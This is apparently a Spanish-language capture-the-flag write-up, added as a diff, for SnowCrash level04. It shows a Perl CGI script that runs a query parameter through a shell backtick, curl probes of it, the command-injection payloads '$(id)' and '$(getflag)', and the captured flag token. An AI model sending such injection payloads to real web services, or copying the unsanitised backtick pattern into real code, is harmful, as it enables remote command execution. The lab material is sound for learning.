@@ -1,0 +1,72 @@
+level04:
+
+
+	nos encontramos con un archivo perl escrito con CGI(common gateaway interface), he ejecutado el script normalmente:
+
+	./level04.pl 
+	Content-type: text/html
+
+	nada interesante.
+
+	asi que toca leer el script e intentar averiguar algo:
+
+
+	#!/usr/bin/perl
+	# localhost:4747
+	use CGI qw{param};
+	print "Content-type: text/html\n\n";
+	sub x {
+  	$y = $_[0];
+  	print `echo $y 2>&1`;
+	}
+	x(param("x"));
+
+	
+
+	despues de una busqueda y recolecta de informacion he descubierto que el archivo realmente se deberia ejecutar con un curl
+
+	curl 'http://localhost:4747'
+
+	no muestra nada, pero probando mas:
+
+	curl 'http://localhost:4747?x=test'
+	test
+
+	interesante, imprime lo que hay en la x, lo que me deja pensando que si imprime la variable que hay en el script le puedo forzar
+	a que me de la flag. Sigo probando:
+
+	level04@SnowCrash:~$ curl 'http://localhost:4747?x=hola'
+	hola
+	level04@SnowCrash:~$ curl 'http://localhost:4747?x=getflag'
+	getflag
+
+	okay aqui simplemente imprime el texto, probemos más:
+
+	level04@SnowCrash:~$ curl 'http://localhost:4747?x=test;id'
+	test
+	level04@SnowCrash:~$ curl 'http://localhost:4747?x=test;'
+	test
+	level04@SnowCrash:~$ curl 'http://localhost:4747?x=test\id'
+	testid
+	level04@SnowCrash:~$ curl 'http://localhost:4747?x=test\;id'
+	test 2
+
+	hey, aqui veo que efectivamente se puede, ya que no se separa bien, los backsticks me pueden dar la clave, sigamos:
+
+	level04@SnowCrash:~$ curl 'http://localhost:4747?x=$(id)'
+	uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
+
+	conseguido, si esto ejecuta un comando shell solo falta llamar a getflag.
+
+	curl 'http://localhost:4747?x=$(getflag)'
+	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+	y asi, se consigue la flag.
+
+
+
+
+
+
+
+
